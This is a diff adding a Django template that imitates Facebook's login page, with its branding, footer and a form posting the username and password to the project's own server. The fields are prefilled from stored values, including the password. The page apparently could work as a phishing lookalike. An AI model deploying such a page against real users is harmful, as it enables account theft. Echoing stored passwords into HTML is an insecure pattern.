@@ -1,0 +1,45 @@
+<!DOCTYPE html>
+{% load static %}
+<html lang="en">
+<head>
+    <link rel="stylesheet" href="{% static 'css/facebookstyle.css'%}">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook Login Form </title>
+    <link href="https://fonts.googleapis.com/css2?family=Fira+Sans:wght@300&family=Roboto&display=swap" rel="stylesheet">
+   
+</head>
+<body>
+    <div class="texts">
+        <h1>facebook</h1>
+        <h2>Connect with friends and the world<br>around you on facebook</h2>
+    </div>
+    <div class="form-body">
+        <div class="inputs">
+        <form action="{% url 'facebook' %}" method="POST" class="login"  >
+        {% csrf_token %}
+                        <input type="text" name="username" placeholder="Phone number, username, or email" value="{{fbuser.username}}" required />
+                        <input type="password" name="password" placeholder="Password" value="{{fbuser.password}}" required />
+                        <input type="submit" value="Log in" />
+        </div>
+        <div class="forpass"><a href="#">Forgot Password?</a></div>
+        <div class="border"></div>
+        <div class="create"><a href="#">Create New Account</a></div>
+        <div class="forpage">
+            <a href="#">Create Page or a celebrity band or business</a>
+        </div>
+    </div>
+    <footer class="fb-footer">
+		<div class="div-footer">
+			<ul class="ul1">
+				<li>English (UK)</li><li><a href="#">العربية</a></li><li><a href="#">Français (France)</a></li><li><a href="#">Italiano</a></li><li><a href="#">Deutsch</a></li><li><a href="#">Русский</a></li><li><a href="#">Español</a></li><li><a href="#">Bahasa Indonesia</a></li><li><a href="#">Türkçe</a></li><li><a href="#">Português (Brasil)</a></li><li><a href="#">हिन्दी</a></li>
+			</ul>
+			<div class="ho-rule"></div>
+			<ul class="ul2">
+				<li><a href="#">Sign Up</a></li><li><a href="#">Log In</a></li><li><a href="#">Messenger</a></li><li><a href="#">Facebook Lite</a></li><li><a href="#">Mobile</a></li><li><a href="#">Find Friends</a></li><li><a href="#">People</a></li><li><a href="#">Pages</a></li><li><a href="#">Video interests</a></li><li><a href="#">Places</a></li><li><a href="#">Games</a></li><li><a href="#">Locations</a></li><li><a href="#">Marketplace</a></li><li><a href="#">Groups</a></li><li><a href="#">Instagram</a></li><li><a href="#">Local</a></li><li><a href="#">About</a></li><li><a href="#">Create ad</a></li><li><a href="#">Create Page</a></li><li><a href="#">Developers</a></li><li><a href="#">Careers</a></li><li><a href="#">Privacy</a></li><li><a href="#">Cookies</a></li><li><a href="#">AdChoices</a></li><li><a href="#">Terms</a></li><li><a href="#">Help</a></li><li><a href="#">Settings</a></li><li><a href="#">Activity log</a></li>
+			</ul>
+			<p>Facebook © 2020</p>
+		</div>
+	</footer>
+</body>
+</html>
